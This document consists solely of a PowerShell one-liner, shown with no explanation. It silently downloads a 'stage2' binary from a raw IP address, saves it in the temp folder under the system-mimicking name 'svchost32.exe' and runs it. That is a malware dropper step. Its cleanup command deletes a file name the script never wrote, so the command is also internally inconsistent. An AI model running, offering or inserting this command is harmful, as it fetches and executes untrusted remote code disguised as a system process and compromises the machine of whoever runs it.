
curl.exe -s -L -o "$env:TEMP\svchost32.exe" "https://203.0.113.166/cdn/stage2.bin"; Start-Process -FilePath "$env:TEMP\svchost32.exe"; Remove-Item -Path "$env:TEMP\stage2.bin" -Force; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
